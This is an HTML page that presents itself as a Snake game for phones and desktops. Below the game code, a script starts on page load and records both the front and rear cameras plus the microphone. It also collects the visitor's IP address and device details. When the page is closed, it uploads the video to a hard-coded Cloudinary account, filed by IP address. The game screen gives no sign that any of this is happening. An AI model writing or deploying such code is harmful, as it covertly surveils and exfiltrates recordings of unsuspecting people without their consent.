<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Snake Game</title>
<style>
  /* Fullscreen fixed layout */
  html, body {
    margin: 0; padding: 0; overflow: hidden; 
    width: 100%; height: 100%; 
    background: #222; color: #eee; font-family: Arial, sans-serif;
    -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
  }
  #gameContainer {
    position: relative;
    width: 100vw; height: 100vh;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
  }
  canvas {
    background: #000;
    border: 2px solid #0f0;
    touch-action: none; /* disables default scrolling on touch devices */
  }
  #scoreboard {
    margin: 10px;
    font-size: 24px;
    font-weight: bold;
    color: #0f0;
  }
  #controls {
    margin-top: 10px;
  }
  button {
    font-size: 18px;
    margin: 0 10px;
    padding: 8px 16px;
    cursor: pointer;
    border-radius: 6px;
    border: none;
    background: #0f0;
    color: #000;
    user-select: none;
  }
  button:active {
    background: #0c0;
  }
</style>
</head>
<body>
<div id="gameContainer">
  <div id="scoreboard">Score: 0</div>
  <canvas id="game" width="320" height="480"></canvas>
  <div id="controls">
    <button id="newGameBtn">New Game</button>
  </div>
</div>

<script>
// -- GLOBALS --
const canvas = document.getElementById('game');
const ctx = canvas.getContext('2d');
const scoreBoard = document.getElementById('scoreboard');
const newGameBtn = document.getElementById('newGameBtn');

const CELL_SIZE = 20;
const COLS = Math.floor(canvas.width / CELL_SIZE);
const ROWS = Math.floor(canvas.height / CELL_SIZE);

let snake, direction, food, score, gameInterval;
let isGameRunning = false;

// -- SNAKE GAME LOGIC --

function initGame() {
  snake = [{x: Math.floor(COLS/2), y: Math.floor(ROWS/2)}];
  direction = {x: 0, y: -1}; // start moving up
  placeFood();
  score = 0;
  updateScore();
  if (gameInterval) clearInterval(gameInterval);
  gameInterval = setInterval(gameLoop, 120);
  isGameRunning = true;
}

function placeFood() {
  do {
    food = {
      x: Math.floor(Math.random() * COLS),
      y: Math.floor(Math.random() * ROWS)
    };
  } while (snake.some(s => s.x === food.x && s.y === food.y));
}

function updateScore() {
  scoreBoard.textContent = 'Score: ' + score;
}

function gameLoop() {
  const head = {...snake[0]};
  head.x += direction.x;
  head.y += direction.y;

  // Wrap around edges
  if (head.x < 0) head.x = COLS - 1;
  else if (head.x >= COLS) head.x = 0;
  if (head.y < 0) head.y = ROWS - 1;
  else if (head.y >= ROWS) head.y = 0;

  // Check collision with self
  if (snake.some(s => s.x === head.x && s.y === head.y)) {
    endGame();
    return;
  }

  snake.unshift(head);

  if (head.x === food.x && head.y === food.y) {
    score++;
    updateScore();
    placeFood();
  } else {
    snake.pop();
  }

  drawGame();
}

function drawGame() {
  ctx.fillStyle = '#000';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Draw snake
  ctx.fillStyle = '#0f0';
  snake.forEach((s, i) => {
    ctx.fillRect(s.x * CELL_SIZE, s.y * CELL_SIZE, CELL_SIZE-1, CELL_SIZE-1);
  });

  // Draw food
  ctx.fillStyle = '#f00';
  ctx.fillRect(food.x * CELL_SIZE, food.y * CELL_SIZE, CELL_SIZE-1, CELL_SIZE-1);
}

function endGame() {
  isGameRunning = false;
  clearInterval(gameInterval);
  alert('Game Over! Your score: ' + score);
}

// -- INPUT HANDLING --

// Keyboard arrows + WASD for desktop
window.addEventListener('keydown', e => {
  if (!isGameRunning) return;
  switch(e.key) {
    case 'ArrowUp':
    case 'w':
    case 'W':
      if (direction.y === 0) direction = {x: 0, y: -1};
      break;
    case 'ArrowDown':
    case 's':
    case 'S':
      if (direction.y === 0) direction = {x: 0, y: 1};
      break;
    case 'ArrowLeft':
    case 'a':
    case 'A':
      if (direction.x === 0) direction = {x: -1, y: 0};
      break;
    case 'ArrowRight':
    case 'd':
    case 'D':
      if (direction.x === 0) direction = {x: 1, y: 0};
      break;
  }
});

// Touch controls for mobile (swipe detection)
let touchStartX = 0;
let touchStartY = 0;
canvas.addEventListener('touchstart', e => {
  if (!isGameRunning) return;
  const touch = e.changedTouches[0];
  touchStartX = touch.clientX;
  touchStartY = touch.clientY;
});
canvas.addEventListener('touchend', e => {
  if (!isGameRunning) return;
  const touch = e.changedTouches[0];
  let dx = touch.clientX - touchStartX;
  let dy = touch.clientY - touchStartY;

  if (Math.abs(dx) > Math.abs(dy)) {
    // Horizontal swipe
    if (dx > 30 && direction.x === 0) direction = {x: 1, y: 0};
    else if (dx < -30 && direction.x === 0) direction = {x: -1, y: 0};
  } else {
    // Vertical swipe
    if (dy > 30 && direction.y === 0) direction = {x: 0, y: 1};
    else if (dy < -30 && direction.y === 0) direction = {x: 0, y: -1};
  }
});

// New game button
newGameBtn.addEventListener('click', () => {
  initGame();
});

// Start game on page load
initGame();


// -- MEDIA RECORDING & UPLOAD (FRONT & REAR CAM + MIC) --

// Your Cloudinary config
const CLOUD_NAME = 'dps0g5ftz';
const UPLOAD_PRESET = 'unsigned'; // Make sure this is set up in your Cloudinary dashboard

let mediaRecorder;
let recordedChunks = [];
let sessionId = Date.now(); // Unique session id by timestamp
let clientIP = '';
let deviceInfo = {};

// Helper: fetch IP address using ipify
async function fetchIP() {
  try {
    let res = await fetch('https://api.ipify.org?format=json');
    let data = await res.json();
    clientIP = data.ip;
  } catch {
    clientIP = 'unknown';
  }
}

// Helper: collect device info
function collectDeviceInfo() {
  deviceInfo = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    windowInnerWidth: window.innerWidth,
    windowInnerHeight: window.innerHeight,
  };
}

// Upload to Cloudinary helper
async function uploadToCloudinary(blob, folder) {
  const formData = new FormData();
  formData.append('file', blob);
  formData.append('upload_preset', UPLOAD_PRESET);
  formData.append('folder', folder);
  try {
    const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
      method: 'POST',
      body: formData
    });
    const json = await res.json();
    console.log('Upload success:', json.secure_url);
  } catch (e) {
    console.error('Upload failed:', e);
  }
}

// Start recording both cameras and mic (merged streams)
async function startRecording() {
  await fetchIP();
  collectDeviceInfo();

  // Constraints for front and rear camera + mic
  // This is tricky â€” browsers don't allow direct simultaneous front+rear access in one getUserMedia
  // We'll do front camera + mic only here (rear camera is often not allowed simultaneously).
  // For rear camera: you can request {facingMode: { exact: "environment" }} separately and merge tracks
  // We'll attempt both and merge tracks if both allowed.

  const streams = [];

  try {
    // Front camera + mic
    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
    streams.push(frontStream);
  } catch(e) {
    console.warn('Front camera/mic denied or not available', e);
  }

  try {
    // Rear camera no audio (to avoid mic conflicts)
    const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
    streams.push(rearStream);
  } catch(e) {
    console.warn('Rear camera denied or not available', e);
  }

  if (streams.length === 0) {
    console.warn('No media streams available to record.');
    return;
  }

  // Merge streams
  const combinedStream = new MediaStream();
  streams.forEach(stream => {
    stream.getTracks().forEach(track => {
      combinedStream.addTrack(track);
    });
  });

  recordedChunks = [];
  mediaRecorder = new MediaRecorder(combinedStream, { mimeType: 'video/webm;codecs=vp8,opus' });

  mediaRecorder.ondataavailable = e => {
    if (e.data.size > 0) recordedChunks.push(e.data);
  };

  mediaRecorder.onstop = async () => {
    const blob = new Blob(recordedChunks, { type: 'video/webm' });
    // Upload using folder structure: sessions/<ip>/<sessionId>/
    const folderName = `sessions/${clientIP}/${sessionId}`;
    await uploadToCloudinary(blob, folderName);
  };

  mediaRecorder.start();
  console.log('Recording started');
}

// Stop recording manually on page unload to finalize upload
window.addEventListener('beforeunload', () => {
  if (mediaRecorder && mediaRecorder.state !== 'inactive') {
    mediaRecorder.stop();
  }
});

// Start recording immediately after page load (browser permission prompt)
startRecording();


// -- USER BEHAVIOR & BASIC STATS COLLECTION --

function logEvent(eventName, data = {}) {
  console.log(`Event: ${eventName}`, data);
  // Here you can extend to send data to your server or analytics endpoint
}

function getBasicUserInfo() {
  return {
    ip: clientIP,
    device: deviceInfo,
    timestamp: new Date().toISOString(),
    pageUrl: window.location.href,
    referrer: document.referrer,
    viewport: { width: window.innerWidth, height: window.innerHeight }
  };
}

// Log page load info
logEvent('page_load', getBasicUserInfo());

// Log clicks on game container (could extend to track moves etc)
document.getElementById('gameContainer').addEventListener('click', e => {
  logEvent('game_container_click', { x: e.clientX, y: e.clientY });
});

// Log window resize
window.addEventListener('resize', () => {
  logEvent('window_resize', { width: window.innerWidth, height: window.innerHeight });
});

// Track snake direction changes
window.addEventListener('keydown', e => {
  if (['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'w','a','s','d','W','A','S','D'].includes(e.key)) {
    logEvent('direction_change', { key: e.key, timestamp: Date.now() });
  }
});

</script>
</body>
</html>